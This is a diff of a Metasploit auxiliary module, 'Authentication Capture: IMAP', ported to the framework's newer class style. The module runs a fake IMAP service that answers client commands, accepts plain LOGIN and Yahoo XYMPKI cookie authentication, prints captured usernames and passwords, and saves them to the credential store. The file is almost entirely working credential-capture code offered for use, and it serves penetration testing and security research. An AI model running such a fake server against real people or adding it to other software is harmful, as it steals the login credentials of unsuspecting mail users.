@@ -1,125 +1,132 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::TcpServer
+  include Msf::Auxiliary::Report
 
+  def initialize
+    super(
+      'Name'        => 'Authentication Capture: IMAP',
+      'Description'    => %q{
+        This module provides a fake IMAP service that
+      is designed to capture authentication credentials.
+      },
+      'Author'      => ['ddz', 'hdm'],
+      'License'     => MSF_LICENSE,
+      'Actions'     =>
+        [
+          [ 'Capture' ]
+        ],
+      'PassiveActions' =>
+        [
+          'Capture'
+        ],
+      'DefaultAction'  => 'Capture'
+    )
 
-require 'msf/core'
+    register_options(
+      [
+        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 143 ]),
+        OptString.new('BANNER', [ true, "The server banner",  'IMAP4'])
+      ])
+  end
 
+  def setup
+    super
+    @state = {}
+  end
 
-class Metasploit3 < Msf::Auxiliary
+  def run
+    exploit()
+  end
 
-	include Msf::Exploit::Remote::TcpServer
-	include Msf::Auxiliary::Report
+  def on_client_connect(c)
+    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    c.put "* OK #{datastore['BANNER']}\r\n"
+  end
 
+  def on_client_data(c)
+    data = c.get_once
+    return unless data
+    num, cmd, arg = data.strip.split(/\s+/, 3)
+    arg ||= ""
 
-	def initialize
-		super(
-			'Name'        => 'Authentication Capture: IMAP',
-			'Version'     => '$Revision$',
-			'Description'    => %q{
-				This module provides a fake IMAP service that
-			is designed to capture authentication credentials.
-			},
-			'Author'      => ['ddz', 'hdm'],
-			'License'     => MSF_LICENSE,
-			'Actions'     =>
-				[
-					[ 'Capture' ]
-				],
-			'PassiveActions' =>
-				[
-					'Capture'
-				],
-			'DefaultAction'  => 'Capture'
-		)
+    if cmd.upcase == 'CAPABILITY'
+      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
+        "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
+        "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
+        "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
+      c.put "#{num} OK CAPABILITY completed.\r\n"
+    end
 
-		register_options(
-			[
-				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 143 ])
-			], self.class)
-	end
+    # Handle attempt to authenticate using Yahoo's magic cookie
+    # Used by iPhones and Zimbra
+    if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'
+      c.put "+ \r\n"
+      cookie1 = c.get_once
+      c.put "+ \r\n"
+      cookie2 = c.get_once
+      register_creds(@state[c][:ip], cookie1, cookie2, 'imap-yahoo')
+      return
+    end
 
-	def setup
-		super
-		@state = {}
-	end
+    if cmd.upcase == 'LOGIN'
+      @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
 
-	def run
-		exploit()
-	end
+      register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
+      print_good("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      return
+    end
 
-	def on_client_connect(c)
-		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-		c.put "* OK IMAP4\r\n"
-	end
+    if cmd.upcase == 'LOGOUT'
+      c.put("* BYE IMAP4rev1 Server logging out\r\n")
+      c.put("#{num} OK LOGOUT completed\r\n")
+      return
+    end
 
-	def on_client_data(c)
-		data = c.get_once
-		return if not data
-		num,cmd,arg = data.strip.split(/\s+/, 3)
-		arg ||= ""
+    @state[c][:pass] = data.strip
+    c.put "#{num} NO LOGIN FAILURE\r\n"
+    return
+  end
 
-		if(cmd.upcase == "CAPABILITY")
-			c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
-				"MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
-				"QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
-				"AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
-			c.put "#{num} OK CAPABILITY completed.\r\n"
-		end
+  def on_client_close(c)
+    @state.delete(c)
+  end
 
-		if(cmd.upcase == "AUTHENTICATE" and arg.upcase == "XYMPKI")
-			c.put "+ \r\n"
-			cookie1 = c.get_once
-			c.put "+ \r\n"
-			cookie2 = c.get_once
-			report_auth_info(
-				:host      => @state[c][:ip],
-				:sname     => 'imap-yahoo',
-				:port      => datastore['SRVPORT'],
-				:source_type => "captured",
-				:user      => cookie1,
-				:pass      => cookie2
-			)
-			return
-		end
+  def register_creds(client_ip, user, pass, service_name)
+    # Build service information
+    service_data = {
+      address: client_ip,
+      port: datastore['SRVPORT'],
+      service_name: service_name,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-		if(cmd.upcase == "LOGIN")
-			@state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
+    # Build credential information
+    credential_data = {
+      origin_type: :service,
+      module_fullname: self.fullname,
+      private_data: pass,
+      private_type: :password,
+      username: user,
+      workspace_id: myworkspace_id
+    }
 
-			report_auth_info(
-				:host      => @state[c][:ip],
-				:port      => datastore['SRVPORT'],
-				:sname     => 'imap',
-				:user      => @state[c][:user],
-				:pass      => @state[c][:pass],
-				:active    => true
-			)
-			print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
-			return
-		end
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
 
-		if(cmd.upcase == "LOGOUT")
-			c.put("* BYE IMAP4rev1 Server logging out\r\n")
-			c.put("#{num} OK LOGOUT completed\r\n")
-			return
-		end
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      workspace_id: myworkspace_id
+    }
 
-		@state[c][:pass] = data.strip
-		c.put "#{num} NO LOGIN FAILURE\r\n"
-		return
-
-	end
-
-	def on_client_close(c)
-		@state.delete(c)
-	end
-
-
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
 end
